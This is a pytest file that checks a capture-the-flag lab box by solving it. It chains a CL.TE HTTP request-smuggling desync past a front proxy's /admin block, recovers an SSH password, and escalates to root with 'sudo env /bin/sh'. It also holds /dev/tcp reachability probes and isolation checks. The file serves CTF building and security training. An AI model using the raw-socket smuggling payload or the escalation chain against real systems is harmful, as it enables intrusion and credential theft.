"""Phase 19 verification: cloudbreak-master-frontdoor -- the Master tier
of "Cloudbreak Pipeline". Headline technique: a classic CL.TE HTTP
request-smuggling desync against a front proxy ("frontproxy"), used to
reach an internal-only admin API ("admin-api") that the proxy is
supposed to block direct access to.

Multi-host box (two containers, internal_groups segmentation) -- see
master-two-offices.yaml for the established pattern this follows.
frontproxy is a deliberately naive, hand-rolled Python TCP proxy (raw
`socket` module, no WSGI framework) that frames request bodies purely
by Content-Length and forwards to admin-api over a single persistent,
reused connection. admin-api is built directly on Python's
http.server/socketserver and genuinely honors Transfer-Encoding:
chunked bodies. The CL/TE disagreement between the two is the bug.

Every smuggling-reliant assertion below uses a raw `socket` helper, the
same way request smuggling actually has to be built by hand (requests/
curl normalize headers and refuse to construct this framing).

A real, well-documented property of CL.TE response-queue poisoning: the
single persistent backend connection frontproxy maintains means a
smuggled response can sit queued behind earlier ones rather than
surfacing on the very next read. The _smuggle_fetch() helper below
drains plain follow-up requests one at a time until the expected
marker appears, rather than assuming a fixed read offset -- confirmed
necessary by hand during manual verification of this box (see this
box's commit message for the details).

Requires the box's two images already built
(ctf-boxes/cloudbreak-master-frontdoor-{frontproxy,admin-api}:latest),
`sshpass` on PATH, Docker CLI on PATH, and a running orchestrator
reachable at ORCHESTRATOR_TEST_URL.
"""
import hashlib
import hmac
import os
import shlex
import socket
import subprocess
import time

import pytest
import requests

BASE_URL = os.environ.get("ORCHESTRATOR_TEST_URL", "http://127.0.0.1:9100")
BOX_ID = "cloudbreak-master-frontdoor"
_TEAM_ID_BASE = __import__("secrets").randbelow(1_000_000)

OPS_SSH_PASSWORD = "NimbusOps-Patch-Me-2026!"  # fixed/narrative -- discoverable only via the smuggled /admin/users blob


def expected_flag(secret: str, n: int) -> str:
    digest = hmac.new(secret.encode(), f"{BOX_ID}:{n}".encode(), hashlib.sha256).hexdigest()
    return f"HLC{{{digest[:10]}}}"


def _port(inst: dict, container_port: int) -> int:
    for p in inst["ports"]:
        if p["container_port"] == container_port:
            return p["host_port"]
    raise AssertionError(f"no port {container_port} in instance ports: {inst['ports']}")


def _frontproxy_container(team_id: int) -> str:
    return f"ctf-{BOX_ID}-{team_id}-frontproxy"


def _admin_api_container(team_id: int) -> str:
    return f"ctf-{BOX_ID}-{team_id}-admin-api"


# --- raw-socket CL.TE smuggling primitives (never requests/curl) -----------

def _build_smuggling_request(outer_path: str, smuggled_bytes: bytes) -> bytes:
    """The actual desync payload: an outer request whose own
    Content-Length covers only an innocuous zero-length chunked body
    ("0\\r\\n\\r\\n") -- but that body ALSO contains, appended right
    after it, a second, complete HTTP request. frontproxy forwards all
    of it (framed purely by Content-Length, Transfer-Encoding ignored),
    while admin-api dechunks the same bytes (Transfer-Encoding honored)
    and so parses the appended bytes as a brand new, separate pipelined
    request of its own."""
    body = b"0\r\n\r\n" + smuggled_bytes
    content_length = len(body)
    head = (
        f"POST {outer_path} HTTP/1.1\r\n"
        f"Host: frontproxy\r\n"
        f"Content-Length: {content_length}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
    ).encode("latin-1")
    return head + body


def _plain_request(path: str) -> bytes:
    return f"GET {path} HTTP/1.1\r\nHost: frontproxy\r\n\r\n".encode("latin-1")


def _read_one_http_response(rfile) -> bytes:
    first_line = rfile.readline()
    if not first_line:
        raise OSError("connection closed while reading an HTTP response")
    raw = first_line
    headers = {}
    while True:
        line = rfile.readline()
        if not line:
            raise OSError("connection closed mid-headers")
        raw += line
        if line in (b"\r\n", b"\n"):
            break
        if b":" in line:
            k, _, v = line.decode("latin-1").partition(":")
            headers[k.strip().lower()] = v.strip()
    length = int(headers.get("content-length", "0") or "0")
    body = rfile.read(length) if length else b""
    return raw + body


def _smuggle_fetch(host: str, port: int, smuggled_path: str, marker: str, max_drain: int = 10, timeout: float = 10.0) -> bytes:
    """Sends the CL.TE smuggling request to frontproxy by hand, then
    drains plain follow-up requests until the smuggled target's own
    response (identified by `marker`) surfaces -- see module docstring
    on why a fixed read offset isn't reliable here."""
    smuggled_bytes = f"GET {smuggled_path} HTTP/1.1\r\nHost: admin-api\r\n\r\n".encode("latin-1")
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    rfile = sock.makefile("rb")
    try:
        sock.sendall(_build_smuggling_request("/submit", smuggled_bytes))
        last = _read_one_http_response(rfile)
        if marker.encode("latin-1") in last:
            return last
        for _ in range(max_drain):
            sock.sendall(_plain_request("/trigger"))
            last = _read_one_http_response(rfile)
            if marker.encode("latin-1") in last:
                return last
        raise AssertionError(
            f"smuggled response for {smuggled_path!r} never surfaced within {max_drain} drain attempts; last={last!r}"
        )
    finally:
        sock.close()


def _plain_get(host: str, port: int, path: str, timeout: float = 10.0) -> bytes:
    sock = socket.create_connection((host, port), timeout=timeout)
    rfile = sock.makefile("rb")
    try:
        sock.sendall(_plain_request(path))
        return _read_one_http_response(rfile)
    finally:
        sock.close()


# --- SSH / privesc helpers ---------------------------------------------------

def _ssh_via_frontproxy(frontproxy_container: str, command: str, timeout: float = 20.0) -> subprocess.CompletedProcess:
    """admin-api has no published port at all -- by design, the only
    network path to it is frontproxy's own smuggling bug, not a direct
    connection. The SSH foothold step is therefore performed from a
    shell on frontproxy's own container (which, being on the same
    internal_groups network, can reach admin-api by alias) -- the same
    docker-exec mechanism test_phase3_multihost.py already uses to
    verify internal reachability, generalized here to actually run the
    ssh command. See this box's commit message for why: frontproxy is
    deliberately a minimal proxy with no RCE primitive of its own."""
    return subprocess.run(
        [
            "docker", "exec", frontproxy_container,
            "sshpass", "-p", OPS_SSH_PASSWORD,
            "ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=10",
            "ops@admin-api", command,
        ],
        capture_output=True, text=True, timeout=timeout,
    )


def _escalate_via_env(frontproxy_container: str, shell_command: str, timeout: float = 20.0) -> str:
    """The box's one intended privesc: ops has passwordless sudo on
    /usr/bin/env -- the GTFOBins escape is `sudo env /bin/sh`, which
    spawns a root shell because env execs its argument with sudo's own
    (root) privileges."""
    remote_cmd = f"sudo env /bin/sh -c {shlex.quote(shell_command)}"
    result = _ssh_via_frontproxy(frontproxy_container, remote_cmd, timeout=timeout)
    assert result.returncode == 0, f"env escalation failed: rc={result.returncode} stdout={result.stdout!r} stderr={result.stderr!r}"
    return result.stdout


@pytest.fixture(params=["docker", "kubernetes"])
def box_instance(request):
    backend = request.param
    team_id = _TEAM_ID_BASE + (1 if backend == "docker" else 2)
    secret = __import__("secrets").token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_id, "box_id": BOX_ID, "team_secret": secret, "backend": backend},
    )
    r.raise_for_status()
    inst = r.json()
    try:
        yield inst, secret, backend, team_id
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")


def test_full_ten_flag_chain(box_instance):
    inst, secret, backend, team_id = box_instance
    if backend != "docker":
        pytest.skip("kubernetes verification deferred -- docker-backend only for now")

    host = inst["entry_host"]
    web_port = _port(inst, 80)

    # Flags 1-2: plain recon on frontproxy's own pages, no smuggling.
    index = _plain_get(host, web_port, "/").decode("latin-1")
    assert expected_flag(secret, 1) in index

    docs = _plain_get(host, web_port, "/docs").decode("latin-1")
    assert expected_flag(secret, 2) in docs
    assert "admin-api" in docs
    assert "/admin/" in docs

    # The control the smuggling attack exists to bypass: a direct
    # request to an /admin/ path is blocked at the edge proxy.
    direct = _plain_get(host, web_port, "/admin/dashboard").decode("latin-1")
    assert direct.startswith("HTTP/1.1 403")

    # Flag 3: the smuggled request reaches admin-api's own internal
    # health check -- proves the desync works at all before trying the
    # actually-blocked endpoints.
    ping = _smuggle_fetch(host, web_port, "/internal/ping", marker=expected_flag(secret, 3)).decode("latin-1")
    assert expected_flag(secret, 3) in ping
    assert "pong" in ping

    # Flag 4: smuggle past the /admin/ block to admin-api's dashboard.
    dashboard = _smuggle_fetch(host, web_port, "/admin/dashboard", marker=expected_flag(secret, 4)).decode("latin-1")
    assert expected_flag(secret, 4) in dashboard

    # Flag 5: smuggle to /admin/users -- a JSON blob with the flag AND
    # the ops SSH credential.
    users = _smuggle_fetch(host, web_port, "/admin/users", marker=expected_flag(secret, 5)).decode("latin-1")
    assert expected_flag(secret, 5) in users
    assert OPS_SSH_PASSWORD in users
    assert "ops" in users

    # Flag 6: SSH foothold on admin-api using the recovered credential.
    frontproxy = _frontproxy_container(team_id)
    user_txt = _ssh_via_frontproxy(frontproxy, "cat user.txt")
    assert user_txt.returncode == 0, user_txt.stderr
    assert expected_flag(secret, 6) in user_txt.stdout

    # Flag 7: the hint file pointing at the sudo/GTFOBins privesc.
    notes = _ssh_via_frontproxy(frontproxy, "cat notes.txt")
    assert notes.returncode == 0, notes.stderr
    assert expected_flag(secret, 7) in notes.stdout
    assert "env" in notes.stdout

    sudo_l = _ssh_via_frontproxy(frontproxy, "sudo -l")
    assert "/usr/bin/env" in sudo_l.stdout

    # Flag 8: a root-only file, read via the env escape.
    audit = _escalate_via_env(frontproxy, "cat /root/secret/audit.log")
    assert expected_flag(secret, 8) in audit

    # Flag 9: pre-root checkpoint note, same escape.
    checkpoint = _escalate_via_env(frontproxy, "cat /root/secret/checkpoint.txt")
    assert expected_flag(secret, 9) in checkpoint

    # Flag 10: root.txt.
    root_txt = _escalate_via_env(frontproxy, "cat /root/root.txt")
    assert expected_flag(secret, 10) in root_txt


def test_idempotent_create(box_instance):
    inst, secret, backend, team_id = box_instance
    r = requests.post(
        f"{BASE_URL}/instances",
        json={
            "team_id": team_id, "box_id": BOX_ID, "team_secret": "a-different-secret-must-be-ignored",
            "backend": backend,
        },
    )
    r.raise_for_status()
    assert r.json()["instance_id"] == inst["instance_id"]


def test_cross_team_flag_isolation(box_instance):
    inst, secret, backend, team_id = box_instance
    if backend != "docker":
        pytest.skip("kubernetes verification deferred -- docker-backend only for now")
    team_id_b = team_id + 1000
    secret_b = __import__("secrets").token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_id_b, "box_id": BOX_ID, "team_secret": secret_b, "backend": backend},
    )
    r.raise_for_status()
    inst_b = r.json()
    try:
        host_a, port_a = inst["entry_host"], _port(inst, 80)
        host_b, port_b = inst_b["entry_host"], _port(inst_b, 80)
        index_a = _plain_get(host_a, port_a, "/").decode("latin-1")
        index_b = _plain_get(host_b, port_b, "/").decode("latin-1")
        assert expected_flag(secret, 1) in index_a
        assert expected_flag(secret_b, 1) in index_b
        assert expected_flag(secret, 1) != expected_flag(secret_b, 1)
        assert expected_flag(secret, 1) not in index_b
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst_b['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")


# --- multi-host topology checks (mirrors test_phase3_multihost.py) ---------

@pytest.fixture
def two_teams_docker():
    secret1 = __import__("secrets").token_hex(32)
    secret2 = __import__("secrets").token_hex(32)
    team1 = _TEAM_ID_BASE + 10
    team2 = _TEAM_ID_BASE + 11

    r1 = requests.post(f"{BASE_URL}/instances", json={"team_id": team1, "box_id": BOX_ID, "team_secret": secret1})
    r1.raise_for_status()
    r2 = requests.post(f"{BASE_URL}/instances", json={"team_id": team2, "box_id": BOX_ID, "team_secret": secret2})
    r2.raise_for_status()
    inst1, inst2 = r1.json(), r2.json()
    try:
        yield inst1, inst2, team1, team2
    finally:
        requests.delete(f"{BASE_URL}/instances/{inst1['instance_id']}")
        requests.delete(f"{BASE_URL}/instances/{inst2['instance_id']}")


def test_admin_api_not_published_docker(two_teams_docker):
    """admin-api must have no published port at all -- the only path in
    is frontproxy's smuggling bug, never a direct connection."""
    inst1, _inst2, team1, _team2 = two_teams_docker
    name = _admin_api_container(team1)
    out = subprocess.run(
        ["docker", "inspect", "-f", "{{json .NetworkSettings.Ports}}", name],
        capture_output=True, text=True, check=True,
    )
    import json as _json
    ports = _json.loads(out.stdout)
    for proto_port, bindings in ports.items():
        assert bindings is None, f"admin-api must have no published ports, found {proto_port} -> {bindings}"


def test_front_door_reaches_admin_api_by_alias_docker(two_teams_docker):
    """frontproxy must be able to resolve and reach admin-api by the
    ORIGINAL docker-compose service name/alias "admin-api", not just the
    orchestrator's own container name -- this box's intended solve path
    (and its own proxy code) hardcodes that hostname."""
    inst1, _inst2, team1, _team2 = two_teams_docker
    fd1 = _frontproxy_container(team1)
    resolved = subprocess.run(["docker", "exec", fd1, "getent", "hosts", "admin-api"], capture_output=True, text=True)
    assert resolved.returncode == 0, f"frontproxy could not resolve admin-api's alias: {resolved.stderr}"
    reach = subprocess.run(
        ["docker", "exec", fd1, "timeout", "3", "bash", "-c", "echo > /dev/tcp/admin-api/8000"],
        capture_output=True, text=True,
    )
    assert reach.returncode == 0, "frontproxy could not reach admin-api:8000 by alias"


def test_cross_team_internal_isolation_docker(two_teams_docker):
    """Team A's frontproxy must not reach team B's admin-api directly."""
    inst1, _inst2, team1, team2 = two_teams_docker
    fd1 = _frontproxy_container(team1)
    team2_admin_api = _admin_api_container(team2)
    ip_out = subprocess.run(
        ["docker", "inspect", "-f", "{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}", team2_admin_api],
        capture_output=True, text=True, check=True,
    )
    team2_ip = ip_out.stdout.split()[0]
    reach = subprocess.run(
        ["docker", "exec", fd1, "timeout", "3", "bash", "-c", f"echo > /dev/tcp/{team2_ip}/8000"],
        capture_output=True, text=True,
    )
    assert reach.returncode != 0, "team 1's frontproxy must not reach team 2's admin-api directly"


def test_destroy_actually_tears_down_docker(two_teams_docker):
    inst1, _inst2, team1, _team2 = two_teams_docker
    names = [_frontproxy_container(team1), _admin_api_container(team1)]
    requests.delete(f"{BASE_URL}/instances/{inst1['instance_id']}").raise_for_status()
    time.sleep(1)
    for name in names:
        result = subprocess.run(["docker", "inspect", name], capture_output=True)
        assert result.returncode != 0, f"{name} must be gone after destroy"
